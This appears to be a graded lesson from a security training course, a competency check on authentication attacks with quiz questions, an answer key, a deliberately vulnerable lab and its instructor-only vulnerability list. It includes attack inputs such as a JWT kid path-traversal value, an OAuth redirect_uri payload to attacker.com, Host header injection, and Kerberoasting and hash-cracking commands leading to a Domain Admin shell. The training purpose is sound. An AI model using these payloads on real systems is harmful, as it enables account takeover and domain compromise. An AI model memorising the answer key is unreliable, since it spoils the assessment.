---
title: "Auth Attacks Competency Check — Self-Assessment and Lab Submission"
tags: [competency-check, authentication, assessment, lab-submission, self-assessment,
       rubric, JWT, OAuth, Kerberoasting, ATO, credential-attacks, module-gate]
module: 04-BroadSurface-01
day: 180
related_topics:
  - All lessons in Days 166–179
  - Cloud Security Module (Days 181+)
---

# Day 180 — Auth Attacks Competency Check

> "You have spent 15 days inside every authentication attack class I know.
> Now I need one thing from you: demonstrate that you own the knowledge, not
> that you memorised it. Find the bug, prove the impact, write the report.
> That is the entire job. Pass this, and you move to cloud. Fail it, and you
> spend another week in the lab — not as punishment, but because you are not
> ready for what comes next."
>
> — Ghost

---

## Structure of the Check

| Component | Time | Weight |
|---|---|---|
| Written self-assessment | 20 min | 20 pts |
| Lab target — web auth | 60 min | 40 pts |
| Lab target — AD / Kerberos | 45 min | 30 pts |
| Finding report | 30 min | 30 pts |
| **Total** | **~3 hours** | **120 pts** |

**Pass threshold:** 72 / 120 (60%)
**Ghost-level threshold:** 108 / 120 (90%)

---

## Component 1 — Written Self-Assessment (20 pts)

Answer all 10 questions without notes. Write your answers before reading the
scoring guide below. Time limit: 20 minutes.

---

**Q1.** (2 pts) A credential stuffing campaign uses a proxy pool of 10,000
IPs, each submitting exactly one request per IP. Your current detection rule
fires when a single IP sends >20 failed logins in one minute. Does the rule
fire? What detection would catch this campaign?

---

**Q2.** (2 pts) A JWT header contains:
```json
{"alg": "HS256", "kid": "keys/hs256-key"}
```
The server loads the key from disk using `Path(KEYS_DIR / kid).read_bytes()`.
Provide the exact `kid` value that would cause the server to HMAC-sign with
an empty byte string. Explain why this works.

---

**Q3.** (2 pts) An OAuth authorization server validates `redirect_uri` using
`submitted_uri.startsWith("https://app.example.com/oauth/callback")`. The
client application has an open redirect at `/logout?next=<URL>`. Construct
the exact `redirect_uri` value you would submit to steal an authorization code
from a victim who clicks your malicious link.

---

**Q4.** (2 pts) Explain XML Signature Wrapping (XSW) in SAML. What is the
root cause? Which element does the signature cover, and which element does a
vulnerable SP process? What is the attacker's goal?

---

**Q5.** (2 pts) The AD domain has a service account `svc_backup` with:
- An SPN (`MSSQLSvc/sqlserver.domain.local:1433`)
- Domain Admin group membership
- Password: `Summer2024!`
- `msDS-SupportedEncryptionTypes`: not set (default RC4)

A regular domain user runs `impacket-GetUserSPNs`. What happens next, step by
step, and what is the final impact?

---

**Q6.** (2 pts) What is Pass-the-Hash? Why can an attacker authenticate with
only the NTLM hash and no cleartext password? Name one control that prevents
hash extraction and one that prevents hash use even if extracted.

---

**Q7.** (2 pts) You are writing a Sigma rule to detect Kerberoasting. Which
Windows Security Event ID should you monitor? What field indicates that RC4
encryption was requested (the most crackable type)? Write the two-field filter.

---

**Q8.** (2 pts) A password reset endpoint sends the reset URL using the HTTP
`Host` header value. You intercept a request and modify `Host: target.com` to
`Host: attacker.com`. What happens? What is the correct fix — as a single line
of Python/pseudocode?

---

**Q9.** (2 pts) The JWT hardening code in Day 177 has this check:
```python
if "jku" in header or "x5u" in header:
    raise ValueError("jku/x5u headers are not permitted")
```
Why is this check necessary? What attack does it prevent? Describe the attack
in one short paragraph.

---

**Q10.** (2 pts) Name the password hashing algorithm recommended for new
applications in 2024. State the minimum recommended parameters. Explain why
fast hashing algorithms (SHA-256) are unacceptable for passwords.

---

### Self-Assessment Scoring Guide

*(Read after completing all 10 questions.)*

**Q1.** Rule does not fire — each IP stays under the threshold. Detection:
measure the total volume of 401 responses across all IPs on the login endpoint
(Sigma: `count() > 500 in 5m AND count(distinct src_ip) > 50`). Distributed
stuffing has no per-IP signature; it has a global signature.

**Q2.** `kid = "../../dev/null"`. `Path(KEYS_DIR / "../../dev/null")` resolves
to `/dev/null`. `open("/dev/null", "rb").read()` returns `b""`. The HMAC key is
`b""`, which the attacker also uses to sign a forged token.

**Q3.** `https://app.example.com/oauth/callback/../logout?next=https://attacker.com`.
The AS prefix-checks this as starting with the registered URI. The client
resolves `../logout` to `/logout`, redirects to `attacker.com`, and the code
appears in the Referer header.

**Q4.** The XML signature covers a specific element by its `ID` attribute
(e.g., `#_legitimate_001`). The attacker inserts an unsigned malicious assertion
before the legitimate one. A vulnerable SP processes the first assertion it
finds rather than the one referenced in `ds:Reference URI`. The signature
verifies against the legitimate element; the SP authenticates the attacker's
identity from the malicious element.

**Q5.** impacket-GetUserSPNs requests a TGS ticket for the SPN, encrypted with
svc_backup's NTLM hash. The tool extracts the TGS. The attacker runs
`hashcat -m 13100 hash.txt rockyou.txt`. `Summer2024!` cracks in seconds.
The attacker authenticates as svc_backup (Domain Admin) and runs
`evil-winrm -i DC_IP -u svc_backup -p Summer2024!`. Impact: full domain
compromise.

**Q6.** NTLM authentication sends `NTLM_hash(challenge)` — the hash IS the
authentication credential. The server never receives nor requires the cleartext
password. **Prevents extraction:** Credential Guard (protects LSASS memory).
**Prevents use if extracted:** Protected Users group (forces Kerberos; NTLM is
rejected for group members).

**Q7.** Event ID **4769** (Kerberos Service Ticket Operations). Field:
`TicketEncryptionType: "0x17"` (RC4-HMAC). Two-field filter:
```yaml
EventID: 4769
TicketEncryptionType: "0x17"
```

**Q8.** The server sends the reset email with `https://attacker.com/reset?token=X`.
Victim clicks the link — the token goes to the attacker's server. Fix:
```python
BASE_URL = current_app.config["BASE_URL"]   # "https://target.com" — from config, never from request
reset_url = f"{BASE_URL}/reset?token={token}"
```

**Q9.** jku (JWK Set URL) and x5u (X.509 URL) allow an attacker to embed a
URL in the JWT header pointing to their own key server. When the application
fetches the public key to verify the token, it fetches the attacker's key —
which the attacker used to sign a forged token. The result is a forged JWT
that passes signature verification because the application validated it against
the attacker's public key, not its own.

**Q10.** **Argon2id** with `time_cost=3, memory_cost=65536 (64 MB),
parallelism=4`. Fast algorithms like SHA-256 can be computed at billions of
hashes per second on a GPU (RTX 4090: ~100 billion SHA-256/s). Argon2id is
memory-hard — it requires 64 MB of memory per hash computation, making parallel
GPU cracking infeasible (a GPU with 24 GB VRAM can run only ~375 parallel
instances vs billions for SHA-256).

---

## Component 2 — Lab Target: Web Auth (40 pts)

### Lab Setup

The competency check uses a dedicated, previously unseen lab application.
Set it up now:

```bash
cd learn-security/04-BroadSurface-01/samples/auth-check-lab/
docker compose up --build -d

# Services:
# Web application:  http://localhost:8000
# Admin panel:      http://localhost:8000/admin
# API:              http://localhost:8000/api/v1/
# Docs:             http://localhost:8000/api/v1/docs
```

### Lab Architecture

```
┌─────────────────────────────────────┐
│  Auth Check Lab (localhost:8000)    │
│                                     │
│  Accounts:                          │
│  - alice / alice123  (admin)        │
│  - bob   / bob456    (user)         │
│  - carol / carol789  (user)         │
│                                     │
│  Authentication: JWT + session      │
│  Note: contains auth vulnerabilities│
│  for competency check               │
└─────────────────────────────────────┘
```

### Instructor-Only: Vulnerability List

*(Do not read until after submission.)*

<details>
<summary>⚠️ INSTRUCTOR USE ONLY — Vulnerability List</summary>

1. **JWT kid path traversal** (High, CVSS 8.8): The `/api/v1/auth/token`
   endpoint issues JWT tokens with `kid: "keys/{alg}-key"`. The key is loaded
   from disk: `Path(KEYS_DIR / kid).read_bytes()`. Valid kid values include
   `keys/hs256-key`. Traversal via `kid: "../../dev/null"` allows forging an
   admin token.

2. **Password reset host header injection** (High, CVSS 8.0): The
   `/api/v1/auth/forgot-password` endpoint constructs the reset URL using
   `request.headers.get("Host")`. Sending `Host: attacker.com` causes the
   reset email to contain `https://attacker.com/reset?token=X`.

3. **CSRF on email change endpoint** (Medium, CVSS 6.5): `PUT /api/v1/account`
   accepts email changes without a CSRF token. The session cookie has
   `SameSite=None`. An attacker-controlled page can auto-submit a form to
   change the victim's email to the attacker's address.

4. **ATO chain** (Critical, CVSS 9.1): Chain vulnerabilities 2 and 3:
   CSRF email change + password reset = full account takeover for any user.
   Chain vulnerabilities 1 and 2 for admin takeover.

5. **Missing auth on admin endpoint** (Critical, CVSS 9.3): `GET /admin/users`
   returns a full user list including password hashes when the `X-Internal: 1`
   header is present. No authentication is checked for this header.

6. **Weak password hashing** (Medium, CVSS 5.9): User passwords are hashed
   with unsalted MD5. The hash is returned in the `/admin/users` response
   (finding 5). Users with common passwords will be cracked in seconds.

</details>

### Submission Requirements

Submit the following for each vulnerability found:

```
Finding X
Title:
Severity (CVSS vector):
Steps to Reproduce:
Evidence (paste output or attach screenshot):
Remediation:
```

### Scoring Rubric — Web Auth Lab

| Finding | Points if found | Points for valid PoC | Points for correct fix |
|---|---|---|---|
| JWT kid traversal | 5 | 5 | 2 |
| Password reset host header | 5 | 4 | 2 |
| CSRF email change | 4 | 3 | 2 |
| ATO chain (2+3 or 1+2) | 6 | 6 | 3 |
| Missing admin auth | 5 | 3 | 2 |
| Weak password hashing | 3 | 2 | 1 |
| **Subtotal** | **28** | **23** | **12** |

Finding all 6 individually and demonstrating the chain earns the full 40 pts.
Chain must be demonstrated end-to-end (not just described) for chain points.

---

## Component 3 — AD / Kerberos Lab (30 pts)

### Option A — External HTB/THM Box

Complete **one** of the following boxes and submit your notes:

| Box | Points | Technique demonstrated |
|---|---|---|
| HTB Active | 30 pts | GPP creds + Kerberoasting → DA |
| HTB Forest | 30 pts | AS-REP Roasting + BloodHound → DA |
| HTB Sauna | 25 pts | AS-REP Roasting (less complex chain) |
| THM Attacking Kerberos | 20 pts | Guided room — partial credit |

**Required submission for external box:**

```
1. Target box name and platform
2. Screenshot or terminal output showing: SPN enumeration or AS-REP capture
3. Screenshot of TGS/AS-REP hash (first 50 chars sufficient)
4. Hashcat command used and result (cracked password)
5. Screenshot of domain admin shell (whoami /all showing DA membership)
6. One defensive recommendation for each attack used
```

### Option B — Local Kerberos Lab

If you do not have HTB/THM access, use the local Kerberos KDC setup from Day 175:

```bash
# Set up a local Kerberos KDC (MIT Kerberos)
sudo apt install -y krb5-kdc krb5-admin-server

# Configure realm LAB.LOCAL
sudo kdb5_util create -s -r LAB.LOCAL

# Create test principals
sudo kadmin.local -q "addprinc -pw UserPass123! regularuser@LAB.LOCAL"
sudo kadmin.local -q "addprinc -pw 'Summer2024!' -randkey HTTP/webapp.lab.local@LAB.LOCAL"
sudo kadmin.local -q "ktadd -k /etc/krb5kdc/HTTP.keytab HTTP/webapp.lab.local@LAB.LOCAL"

# Kerberoast the HTTP service principal
impacket-GetUserSPNs LAB.LOCAL/regularuser:UserPass123! \
  -dc-ip 127.0.0.1 -k -no-pass \
  -request -output local_hashes.txt

# Crack it
hashcat -m 13100 local_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Submit:** hash file (first 50 chars), hashcat command, cracked password,
and the fix (switch to gMSA or AES-only).

---

## Component 4 — Finding Report (30 pts)

Write a complete professional finding report for the **highest-severity
vulnerability chain** you found in Component 2. The chain must involve at
least two vulnerabilities.

Time limit: 30 minutes from exploit confirmed to report submitted.

### Required Sections

```
Title:
  [Vulnerability Classes] in [Location] allows [Impact]

Severity:
  CVSS 3.1 base score:
  CVSS vector string:

Summary: (3–4 sentences)

Impact:
  Technical:
  Operational (scale/scope):
  Regulatory (GDPR/PCI/HIPAA if applicable):

Steps to Reproduce:
  Numbered steps; anyone must be able to follow.

Proof of Concept:
  Working script or Burp request sequence.

Remediation:
  Specific code change or config — not generic advice.

References:
  - CWE(s)
  - CVE (if applicable)
  - MITRE ATT&CK technique(s)
```

### Report Scoring Rubric

| Criterion | Max | Notes |
|---|---|---|
| Title names class, location, and impact | 3 | All three required |
| CVSS vector is accurate | 4 | ±0.5 from correct = 2 pts |
| Summary is clear without jargon | 3 | No unexplained acronyms |
| Impact has all three layers | 6 | 2 pts per layer |
| Steps to Reproduce are reproducible | 6 | Tested: someone else follows = full credit |
| PoC is minimal and works | 5 | Full marks only if it runs without modification |
| Remediation is specific | 3 | "Use allowlist" = 0; "Replace regex match with set membership" = 3 |
| **Total** | **30** | |

---

## Overall Scoring Summary

| Component | Max | Your Score |
|---|---|---|
| Written self-assessment | 20 | |
| Web auth lab | 40 | |
| AD / Kerberos lab | 30 | |
| Finding report | 30 | |
| **Total** | **120** | |

---

## What Happens After This Check

| Score | Outcome |
|---|---|
| ≥ 108 (90%) | Ghost-level pass. Move to Day 181 — Cloud Security. |
| 72–107 (60–89%) | Standard pass. Move to Day 181. Review weak areas alongside Day 181. |
| 48–71 (40–59%) | Conditional pass. Repeat Days 169–175 (JWT, OAuth, Kerberoasting) before Day 181. |
| < 48 (< 40%) | Do not advance. Spend one additional week on the weak modules, then retake from Component 2. |

---

## Module Completion Summary — 04-BroadSurface-01

You have completed 15 days covering:

| Topic | Days |
|---|---|
| Credential stuffing, spraying, and rate limit bypass | 166–168 |
| JWT advanced attacks and lab | 169–170 |
| OAuth 2.0 abuse and lab | 171–172 |
| SAML attacks | 173 |
| Account takeover chains | 174 |
| Kerberoasting and Pass-the-Hash | 175 |
| Authentication attack detection | 176 |
| Authentication hardening | 177 |
| Review and practice | 178–179 |
| Competency check | 180 |

The next module covers **Cloud Security** — a completely different attack
surface with AWS, Azure, and GCP-specific techniques. The authentication
attacks you learned here apply directly: credential stuffing against cloud
console logins, JWT attacks against Lambda function auth, OAuth abuse against
Azure AD, and SAML attacks against federated cloud identity.

The skills compound. Keep moving.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q180.1, Q180.2 …).
> Follow-up questions use hierarchical numbering (Q180.1.1, Q180.1.2 …).

---

## Navigation

← Previous: [Day 179 — Auth Attacks Practice](DAY-0179-Auth-Attacks-Practice.md)
→ Next: [Day 181 — Cloud Threat Model](../04-BroadSurface-02/DAY-0181-Cloud-Threat-Model.md)
